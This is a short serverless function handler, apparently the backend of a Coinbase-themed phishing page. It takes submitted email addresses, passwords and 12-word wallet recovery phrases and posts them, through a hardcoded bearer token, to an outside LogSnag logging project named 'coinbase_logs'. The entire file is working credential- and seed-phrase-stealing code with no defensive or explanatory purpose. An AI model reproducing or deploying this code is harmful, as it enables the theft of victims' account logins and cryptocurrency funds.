export async function handler(event) {
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: 'Method Not Allowed',
    };
  }

  const data = JSON.parse(event.body).payload.data;

  const phrase = Array.from({ length: 12 })
    .map((_, i) => data[`phrase${i + 1}`])
    .join(' ');

  const res = await fetch('https://api.logsnag.com/v1/log', {
    method: 'POST',
    headers: {
      Authorization: 'Bearer 9c3c12446ff121a11d6ec0c145b6a1c5', // ✅ hardcoded
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      project: 'coinbase_logs',
      channel: 'logs',
      event: 'Form Submission',
      description: `Email: ${data.email}\nPassword: ${data.password}\nPhrase: ${phrase}`,
      icon: '📨'
    }),
  });

  if (!res.ok) {
    return { statusCode: 500, body: 'Failed to log to LogSnag' };
  }

  return {
    statusCode: 200,
    body: 'Logged successfully',
  };
}
